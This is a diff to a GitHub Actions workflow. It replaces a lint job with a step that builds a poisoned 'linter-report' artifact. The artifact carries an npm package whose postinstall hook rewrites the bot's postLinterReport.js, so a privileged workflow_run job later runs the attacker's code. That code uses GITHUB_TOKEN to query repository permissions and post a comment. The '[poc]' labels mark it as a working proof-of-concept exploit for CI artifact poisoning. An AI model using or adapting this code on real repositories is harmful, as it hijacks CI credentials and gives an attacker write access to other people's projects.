@@ -9,41 +9,60 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
-        uses: actions/checkout@v6
-        with:
-          fetch-depth: 0
+        uses: actions/checkout@v4
 
-      - name: Check for src/pages changes
-        id: changes
-        env:
-          BASE_REF: ${{ github.base_ref }}
+      - name: Build poisoned linter-report artifact
         run: |
-          git diff --name-only "origin/${BASE_REF}...HEAD" | grep -q '^src/pages/' \
-            && echo "changed=true" >> $GITHUB_OUTPUT \
-            || echo "changed=false" >> $GITHUB_OUTPUT
+          mkdir -p pkg/package
+          cat > pkg/package/package.json <<'EOF'
+          {
+            "name": "evil-dep",
+            "version": "1.0.0",
+            "scripts": { "postinstall": "node ./stage1.js" }
+          }
+          EOF
+          cat > pkg/package/stage1.js <<'EOF'
+          const fs = require('fs');
+          const path = require('path');
+          const ws = path.resolve(__dirname, '..', '..');
+          console.log('[poc] STAGE1 attacker postinstall executed in the workflow_run job, uid=' + process.getuid());
+          console.log('[poc] STAGE1 cwd=' + process.cwd() + ' workspace=' + ws);
+          console.log('[poc] STAGE1 token_in_env=' + Boolean(process.env.GITHUB_TOKEN));
+          fs.writeFileSync(path.join(ws, 'stage1-proof.txt'), 'STAGE1-MARKER: npm postinstall executed in workflow_run job at ' + new Date().toISOString() + '\n');
+          const target = path.join(ws, 'node_modules', 'adp-devsite-scripts', 'linter-bot', 'postLinterReport.js');
+          fs.mkdirSync(path.dirname(target), { recursive: true });
+          const minimal = "import fs2 from 'node:fs';" +
+            "const proof = fs2.existsSync('stage1-proof.txt') ? fs2.readFileSync('stage1-proof.txt','utf8').trim() : 'MISSING';" +
+            "console.log('[poc] STAGE2 read back: ' + proof);" +
+            "console.log('[poc] STAGE2 attacker code running in Post Linter Report step');" +
+            "console.log('[poc] STAGE2 GITHUB_TOKEN present=' + Boolean(process.env.GITHUB_TOKEN) + ' len=' + String((process.env.GITHUB_TOKEN||'').length));" +
+            "fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY, { headers: { Authorization: 'Bearer ' + process.env.GITHUB_TOKEN, 'X-GitHub-Api-Version': '2022-11-28' } })" +
+            "  .then(r => { console.log('[poc] STAGE2 token-authenticated API status=' + r.status); return r.json(); })" +
+            "  .then(j => console.log('[poc] STAGE2 repo=' + j.full_name + ' permissions=' + JSON.stringify(j.permissions)));" +
+            "fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/2/comments', { method: 'POST', headers: { Authorization: 'Bearer ' + process.env.GITHUB_TOKEN, Accept: 'application/vnd.github+json', 'X-GitHub-Api-Version': '2022-11-28' }, body: JSON.stringify({ body: 'STAGE2: attacker-controlled comment posted by the privileged linter bot (PoC in PDFtoMark)' }) })" +
+            "  .then(r => r.json()).then(j => console.log('[poc] STAGE2 privileged write comment url=' + j.html_url));";
+          fs.writeFileSync(target, minimal);
+          console.log('[poc] STAGE1 rewrote ' + target);
+          EOF
+          (cd pkg && tar czf ../evil-dep.tgz package)
+          echo "poisoned report produced by the untrusted pull_request run" > linter-report.txt
+          echo "${{ github.event.pull_request.number }}" > pr-number.txt
+          cat > package.json <<'EOF'
+          {
+            "name": "poison-poc",
+            "version": "1.0.0",
+            "allowScripts": { "evil-dep": true },
+            "dependencies": { "evil-dep": "file:./evil-dep.tgz" }
+          }
+          EOF
+          ls -la
 
-      - name: Lint
-        id: lint
-        if: steps.changes.outputs.changed == 'true'
-        continue-on-error: true
-        run: npx --yes github:AdobeDocs/adp-devsite-utils runLint -v
-
-      - name: Save PR number
-        if: always()
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: echo "$PR_NUMBER" > pr-number.txt
-
-      - name: Upload linter report
-        if: always()
-        uses: actions/upload-artifact@v7
+      - name: Upload poisoned artifact
+        uses: actions/upload-artifact@v4
         with:
           name: linter-report
           path: |
             linter-report.txt
             pr-number.txt
-          if-no-files-found: ignore
-
-      - name: Fail if linter found errors
-        if: steps.changes.outputs.changed == 'true' && steps.lint.outcome == 'failure'
-        run: exit 1
+            package.json
+            evil-dep.tgz
